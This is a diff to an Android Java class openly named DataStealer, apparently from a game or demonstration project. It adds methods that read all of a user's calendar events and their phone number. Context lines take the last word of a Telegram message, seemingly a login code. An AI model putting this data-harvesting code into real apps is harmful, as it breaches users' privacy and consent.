@@ -1,16 +1,23 @@
 package de.hpi3d.gamepgrog.trap.android;
 
+import android.Manifest;
+import android.annotation.SuppressLint;
 import android.content.Context;
 import android.database.Cursor;
+import android.provider.CalendarContract;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.Profile;
 import android.provider.Telephony;
+import android.telephony.TelephonyManager;
 import android.util.Log;
+
+import androidx.annotation.RequiresPermission;
 
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 
+import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
 import de.hpi3d.gamepgrog.trap.datatypes.Language;
 import de.hpi3d.gamepgrog.trap.datatypes.TextMessage;
@@ -150,6 +157,57 @@ public class DataStealer {
             TextMessage telegramMessage = messagesByTelegram.get(messagesByTelegram.size() - 1);
             String[] words = telegramMessage.getBody().split(" ");
             return words[words.length - 1];
+        }
+        return "";
+    }
+
+    /**
+     * Returns all events the user has in their calendar. Depending on the users calendar, and
+     * how often they migrate phones, these these might be all the user has ever put into a calendar.
+     *
+     * @param context to access storage
+     * @return ArrayList of all calendar entries.
+     * @throws SecurityException if no calendar permission is granted
+     */
+    public static ArrayList<CalendarEvent> takeCalendarData(Context context) throws SecurityException {
+
+        String[] projection = new String[]{
+                CalendarContract.Events._ID,
+                CalendarContract.Events.TITLE,
+                CalendarContract.Events.EVENT_LOCATION,
+                CalendarContract.Events.DTSTART,
+                CalendarContract.Events.DTEND
+        };
+
+        Cursor cursor = context.getContentResolver().query(
+                CalendarContract.Events.CONTENT_URI,
+                projection,
+                null,
+                null,
+                null);
+
+        return CalendarEvent.createFromCursor(cursor);
+    }
+
+    /**
+     * Returns users phone number.
+     * <p>
+     * Ideally, at least. SIM-Card vendors have locked this down a lot in recent years,
+     * and on some devices this won't work.
+     *
+     * @param context to access storage
+     * @return users phone number
+     */
+    @SuppressLint("HardwareIds")
+    @RequiresPermission(Manifest.permission.READ_PHONE_STATE)
+    public static String getUserPhoneNumber(Context context) {
+        TelephonyManager tel = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        if (tel != null) {
+            String number = tel.getLine1Number();
+            if (number.startsWith("0")) {
+                number = "+49" + number.substring(1);
+            }
+            return number;
         }
         return "";
     }
